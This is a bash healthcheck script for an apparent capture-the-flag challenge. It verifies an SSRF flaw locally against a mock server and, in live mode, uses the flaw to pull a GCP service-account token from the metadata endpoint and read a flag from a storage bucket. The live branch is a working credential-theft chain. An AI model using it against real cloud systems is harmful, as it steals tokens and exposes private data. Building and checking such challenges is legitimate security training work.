#!/usr/bin/env bash
# i01 healthcheck. Two modes:
#   local  (default): build the container, point it at a MOCK metadata/target server,
#          and prove the SSRF returns the fetched body (the core mechanic).
#   live   (LIVE=1):  against the deployed VM, pull the real SA token via SSRF and use
#          it to read the scoped bucket object == flag.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ "${LIVE:-0}" = "1" ]; then
  : "${TARGET:?TARGET=http://<vm-ip>:8101 required for live mode}"
  : "${BUCKET:?BUCKET required}"
  TOK="$(curl -fsS "$TARGET/preview?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
        | grep -oE 'ya29[._A-Za-z0-9-]+' | head -1)"
  [ -n "$TOK" ] || { echo "i01 live: no token via SSRF"; exit 1; }
  curl -fsS -H "Authorization: Bearer $TOK" \
    "https://storage.googleapis.com/storage/v1/b/${BUCKET}/o/flag.txt?alt=media" \
    | grep -qE "${FLAG_PREFIX}\{" && { echo "i01 healthcheck rc=0 (live)"; exit 0; }
  echo "i01 healthcheck FAILED (live)"; exit 1
fi

# --- local mechanic verification ---
CID=""; MOCK=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1; [ -n "$MOCK" ] && kill "$MOCK" 2>/dev/null || true' EXIT
docker build -q -t cypher-i01 "$HERE" >/dev/null
CID="$(docker run -d --add-host mocktarget:host-gateway -P cypher-i01)"
PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
# a mock "internal" server the SSRF will fetch, returning a token-shaped body
python3 -c 'import http.server,socketserver;h=http.server.BaseHTTPRequestHandler
class H(http.server.BaseHTTPRequestHandler):
 def do_GET(self):
  self.send_response(200);self.end_headers();self.wfile.write(b"ya29.MOCKTOKEN_ssrf_ok")
 def log_message(self,*a):pass
socketserver.TCPServer(("0.0.0.0",8599),H).serve_forever()' &
MOCK=$!; sleep 1
for i in $(seq 1 20); do curl -fsS "http://127.0.0.1:$PORT/" >/dev/null 2>&1 && break; sleep 0.5; done
BODY="$(curl -fsS "http://127.0.0.1:$PORT/preview?url=http://mocktarget:8599/")"
echo "ssrf body: $BODY"
case "$BODY" in *ya29.MOCKTOKEN_ssrf_ok*) echo "i01 healthcheck rc=0 (local SSRF mechanic)"; exit 0 ;; esac
echo "i01 healthcheck FAILED (local)"; exit 1
